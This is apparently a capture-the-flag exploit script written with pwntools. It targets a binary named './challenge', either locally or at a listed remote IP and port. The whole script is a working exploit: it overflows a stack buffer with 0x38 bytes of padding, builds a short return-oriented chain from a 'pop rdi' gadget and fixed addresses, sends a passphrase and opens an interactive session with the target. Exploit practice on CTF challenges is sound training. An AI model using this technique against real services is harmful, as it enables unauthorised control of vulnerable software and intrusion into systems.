#!/usr/bin/env python3
from pwn import *

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Debian', 'bash', '-c']
context.arch = 'amd64'
host = '34.175.151.38'
port = 2682
elf_name = './challenge'
elf = ELF(elf_name)
# libc = ELF('./libc.so.6')
script = '''
c
'''
# script += 'c\n'
if args.LOCAL:
    p = process(elf_name)
elif args.GDB:
    p = process(elf_name)
    gdb.attach(p, gdbscript=script)
else:
    p = remote(host, port)

rdi = 0x0000000000401393
payload = b'a'*0x38
payload += p64(rdi)
payload += p64(0x000000000402008 + 5)
payload += p64(0x0000000004011E9)

p.sendafter(b'What is your name? ', payload)
p.sendlineafter(b'flag! \n', b'y0ur d4rl1ng')

p.interactive()
